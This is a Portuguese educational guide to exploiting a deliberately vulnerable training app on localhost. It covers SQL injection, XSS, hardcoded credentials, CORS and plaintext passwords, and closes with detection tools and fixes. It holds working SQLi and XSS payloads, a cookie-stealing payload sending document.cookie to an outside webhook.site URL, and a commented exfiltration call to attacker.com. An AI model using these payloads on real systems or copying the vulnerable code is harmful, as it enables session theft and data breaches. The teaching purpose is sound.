# 🔓 Demonstração de Vulnerabilidades - SSDLC Project

Este documento mostra como **demonstrar e explorar** as vulnerabilidades intencionalmente incluídas neste projeto para fins educacionais.

> ⚠️ **AVISO**: Estas técnicas são para fins educacionais APENAS. Nunca use em sistemas de produção ou sem autorização explícita.

---

## 📋 Pré-requisitos

- Backend rodando em: `http://localhost:8080`
- Frontend rodando em: `http://localhost:3000`
- Ferramentas: Navegador (Chrome/Firefox) e `curl` (opcional)

---

## 🚨 Vulnerabilidades Demonstráveis

### 1. 💉 SQL Injection

**Localização:** `UserController.java` - método `searchUsers()`

**Código vulnerável:**
```java
String query = "SELECT username, email FROM users WHERE username LIKE '%" + name + "%'";
```

#### 🎯 Como explorar:

**Exploit 1: Ver todos os usuários**
```bash
# Via curl
curl "http://localhost:8080/users/search?name=%27%20OR%20%271%27=%271"

# Via navegador
http://localhost:8080/users/search?name=' OR '1'='1
```

**Exploit 2: Bypass de autenticação**
```bash
# Terminar a query prematuramente
curl "http://localhost:8080/users/search?name=%27%20OR%201=1--"

# Via navegador
http://localhost:8080/users/search?name=' OR 1=1--
```

**Exploit 3: Extrair estrutura do banco (SQL Error-based)**
```bash
curl "http://localhost:8080/users/search?name=%27%20UNION%20SELECT%20NULL,NULL--"
```

**Resultado esperado:**
- Retorna TODOS os usuários do banco, independente do filtro
- Possível extração de dados sensíveis
- Possível manipulação/deleção de dados

---

### 2. 🎭 Cross-Site Scripting (XSS)

**Localização:** `App.vue` - Múltiplos locais usando `v-html`

#### 🎯 Exploit 1: XSS via Query Parameter

**Código vulnerável:**
```javascript
const msg = urlParams.get('message');
if (msg) {
  this.welcomeMessage = `<p>${msg}</p>`; // Sem sanitização!
}
```

**Como explorar:**
```bash
# Via navegador - Abra esta URL:
http://localhost:3000/?message=<script>alert('XSS Vulnerabilidade!')</script>

# Ou esta (bypass de filtros básicos):
http://localhost:3000/?message=<img src=x onerror=alert('XSS')>
```

#### 🎯 Exploit 2: XSS via busca de usuários

**Abra o frontend e digite na busca:**
```html
<img src=x onerror="alert('XSS na busca!')">

```

#### 🎯 Exploit 3: Roubo de dados (Cookie Stealing)

https://webhook.site/

```html
<img src=x onerror="fetch('https://webhook.site/ac1876cc-68bb-4153-99f6-133f7fb352ff?cookie='+document.cookie)">

```

**Resultado esperado:**
- Pop-up de alerta aparece
- Script malicioso é executado no navegador da vítima
- Possível roubo de sessão/cookies

---

### 3. 🔑 Credenciais Hardcoded

**Localização:** Múltiplos arquivos

#### 📍 Backend - `UserController.java`
```java
private static final String DB_PASSWORD = "P@ssw0rd123"; // ❌ EXPOSTO!
```

#### 📍 Backend - `application.properties`
```properties
spring.datasource.password=P@ssw0rd123  # ❌ EXPOSTO!
```

#### 📍 Frontend - `App.vue`
```javascript
apiKey: 'sk-1234567890abcdef',      // ❌ API Key exposta!
adminToken: 'admin123'              // ❌ Token exposto!
```

#### 🎯 Como explorar:

**1. Inspecionar código-fonte do frontend:**
```bash
# Abra o Developer Tools (F12) no navegador
# Vá para Sources > App.vue
# Procure por: apiKey, adminToken
```

**2. Usar token hardcoded para acessar área admin:**
```bash
curl "http://localhost:8080/users/admin/1?token=admin123"
```

**3. Clonar repositório e buscar por secrets:**
```bash
# GitLeaks ou ferramentas similares vão encontrar:
grep -r "password\|apiKey\|token" .
```

**Resultado esperado:**
- Acesso não autorizado a recursos protegidos
- Exposição de credenciais no repositório Git
- Possível comprometimento do sistema

---

### 4. 📤 Exposição de Dados Sensíveis

**Localização:** `UserController.java` - método `getAdminData()`

**Código vulnerável:**
```java
adminData.put("apiKey", "sk-1234567890abcdef");
adminData.put("dbPassword", DB_PASSWORD); // ❌ Expõe senha do DB!
```

#### 🎯 Como explorar:

**Via curl:**
```bash
curl "http://localhost:8080/users/admin/1?token=admin123"
```

**Via navegador - No frontend:**
1. Clique no botão "Acessar Admin"
2. Abra o Developer Tools (F12) > Console
3. Veja os dados expostos

**Resposta esperada:**
```json
{
  "userId": "1",
  "role": "admin",
  "apiKey": "sk-1234567890abcdef",
  "dbPassword": "P@ssw0rd123"
}
```

**Impacto:**
- Exposição da senha do banco de dados
- Exposição de API Keys
- Comprometimento total do sistema

---

### 5. 🌐 CORS Mal Configurado

**Localização:** `UserController.java`

**Código vulnerável:**
```java
@CrossOrigin(origins = "*") // ❌ Aceita requisições de QUALQUER origem!
```

#### 🎯 Como explorar:

**Criar arquivo HTML malicioso (`exploit.html`):**
```html
<!DOCTYPE html>
<html>
<head><title>CSRF Attack Demo</title></head>
<body>
<h1>Página Maliciosa</h1>
<script>
  // Roubar dados da API
  fetch('http://localhost:8080/users/search?name=admin')
    .then(res => res.json())
    .then(data => {
      console.log('Dados roubados:', data);
      // Enviar para servidor do atacante
      // fetch('http://attacker.com/steal', {method: 'POST', body: JSON.stringify(data)});
    });
</script>
</body>
</html>
```

**Como testar:**
1. Salve o arquivo acima
2. Abra no navegador
3. Abra o Developer Tools > Console
4. Veja os dados sendo acessados

**Impacto:**
- CSRF (Cross-Site Request Forgery)
- Requisições não autorizadas de sites maliciosos
- Roubo de dados via JavaScript malicioso

---

### 6. 📝 Logging de Informações Sensíveis

**Localização:** Múltiplos pontos no código

#### 📍 Backend - `UserController.java`
```java
// ❌ Loga senha do usuário
logger.info("Creating user: " + username + " with password: " + password);

// ❌ Loga API Key
console.log('API Key:', this.apiKey);
```

#### 🎯 Como demonstrar:

**1. Criar um usuário no frontend:**
- Username: `testuser`
- Password: `mySecretPass123`
- Email: `test@example.com`

**2. Verificar os logs do backend:**
```
INFO - Creating user: testuser with password: mySecretPass123  ❌
```

**3. Verificar logs do frontend (Developer Tools > Console):**
```javascript
API Key: sk-1234567890abcdef  ❌
User created: testuser Password: mySecretPass123  ❌
```

**Impacto:**
- Logs podem ser acessados por pessoas não autorizadas
- Compliance/LGPD: violação de privacidade
- Senhas e dados sensíveis ficam em arquivos de log

---

### 7. ⚠️ Falta de Validação de Entrada

**Localização:** `UserController.java` - método `createUser()`

**Código vulnerável:**
```java
// ❌ Sem validação alguma
String username = userData.get("username");
String password = userData.get("password");
String email = userData.get("email");
```

#### 🎯 Como explorar:

**1. Criar usuário com dados inválidos:**
```bash
curl -X POST http://localhost:8080/users/create \
  -H "Content-Type: application/json" \
  -d '{
    "username": "",
    "password": "123",
    "email": "email_invalido"
  }'
```

**2. SQL Injection via criação de usuário:**
```bash
curl -X POST http://localhost:8080/users/create \
  -H "Content-Type: application/json" \
  -d '{
    "username": "admin'\'' OR '\''1'\''='\''1",
    "password": "hack",
    "email": "hack@evil.com"
  }'
```

**3. Injetar scripts maliciosos:**
```bash
curl -X POST http://localhost:8080/users/create \
  -H "Content-Type: application/json" \
  -d '{
    "username": "<script>alert(1)</script>",
    "password": "test",
    "email": "xss@test.com"
  }'
```

**Impacto:**
- Dados inconsistentes no banco
- SQL Injection adicional
- Stored XSS (XSS armazenado)

---

### 8. 🔓 Senha em Texto Plano

**Localização:** `UserController.java` - método `createUser()`

**Código vulnerável:**
```java
// ❌ Senha armazenada SEM hash/criptografia
String query = "INSERT INTO users (username, password, email) VALUES ('" + 
              username + "', '" + password + "', '" + email + "')";
```

#### 🎯 Como demonstrar:

**1. Criar usuário:**
```bash
curl -X POST http://localhost:8080/users/create \
  -H "Content-Type: application/json" \
  -d '{
    "username": "joao",
    "password": "minhaSenhaSecreta123",
    "email": "joao@example.com"
  }'
```

**2. Acessar o H2 Console:**
```
URL: http://localhost:8080/h2-console
JDBC URL: jdbc:h2:mem:testdb;DB_CLOSE_DELAY=-1;DB_CLOSE_ON_EXIT=FALSE
Username: sa
Password: P@ssw0rd123
```

**3. Executar query:**
```sql
SELECT * FROM users;
```

**Resultado:**
```
| ID | USERNAME | PASSWORD              | EMAIL               |
|----|----------|-----------------------|---------------------|
| 5  | joao     | minhaSenhaSecreta123  | joao@example.com    |
```

**Impacto:**
- Senhas visíveis em texto plano no banco
- Se o banco vazar, TODAS as senhas são comprometidas
- Violação grave de segurança e compliance

---

## 🛠️ Ferramentas para Detectar

### 1. OWASP Dependency-Check
```bash
cd backend
mvn org.owasp:dependency-check-maven:check
```
**Detecta:** Dependências vulneráveis (se descomentadas no pom.xml)

### 2. GitLeaks (Secrets Scanner)
```bash
docker run --rm -v "$(pwd):/path" zricethezav/gitleaks:latest detect --source="/path" -v
```
**Detecta:** Credenciais hardcoded, API Keys, tokens

### 3. Snyk
```bash
npm install -g snyk
snyk test
```
**Detecta:** Vulnerabilidades em dependências npm/Maven

### 4. OWASP ZAP (Zed Attack Proxy)
- Scanner automático de vulnerabilidades web
**Detecta:** XSS, SQL Injection, CSRF, etc.

### 5. SonarQube
```bash
mvn sonar:sonar
```
**Detecta:** Code smells, bugs, vulnerabilidades, código duplicado

---

## 📊 Tabela Resumo de Vulnerabilidades

| # | Vulnerabilidade | Localização | Severidade | OWASP Top 10 |
|---|----------------|-------------|------------|---------------|
| 1 | SQL Injection | `UserController.java` | 🔴 Crítica | A03:2021 |
| 2 | XSS | `App.vue` | 🔴 Crítica | A03:2021 |
| 3 | Credenciais Hardcoded | Múltiplos arquivos | 🔴 Crítica | A07:2021 |
| 4 | Exposição de Dados | `getAdminData()` | 🔴 Crítica | A01:2021 |
| 5 | CORS Mal Configurado | `@CrossOrigin` | 🟠 Alta | A05:2021 |
| 6 | Logging Sensível | Múltiplos arquivos | 🟠 Alta | A09:2021 |
| 7 | Falta de Validação | `createUser()` | 🟠 Alta | A03:2021 |
| 8 | Senha em Texto Plano | Banco de dados | 🔴 Crítica | A02:2021 |

---

## ✅ Como Corrigir (Resumo)

### SQL Injection
```java
// ✅ CORRETO: Usar PreparedStatement
String query = "SELECT username, email FROM users WHERE username LIKE ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, "%" + name + "%");
```

### XSS
```javascript
// ✅ CORRETO: Usar sanitização ou {{ }} ao invés de v-html
import DOMPurify from 'dompurify';
this.welcomeMessage = DOMPurify.sanitize(msg);
```

### Credenciais
```properties
# ✅ CORRETO: Usar variáveis de ambiente
spring.datasource.password=${DB_PASSWORD}
```

### Validação
```java
// ✅ CORRETO: Validar entrada
if (username == null || username.trim().isEmpty()) {
    throw new IllegalArgumentException("Username é obrigatório");
}
```

### Senha em Texto Plano
```java
// ✅ CORRETO: Usar hash (BCrypt, Argon2)
String hashedPassword = BCrypt.hashpw(password, BCrypt.gensalt());
```

---

## 🎓 Recursos Educacionais

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)

---

## ⚖️ Disclaimer Legal

Este projeto e documentação são **exclusivamente para fins educacionais**. As vulnerabilidades foram intencionalmente incluídas para demonstrar práticas inseguras de desenvolvimento.

**NUNCA:**
- Use estas técnicas em sistemas de produção
- Teste em sistemas sem autorização explícita
- Compartilhe exploits para fins maliciosos

**Uso ético e educacional APENAS!**

---

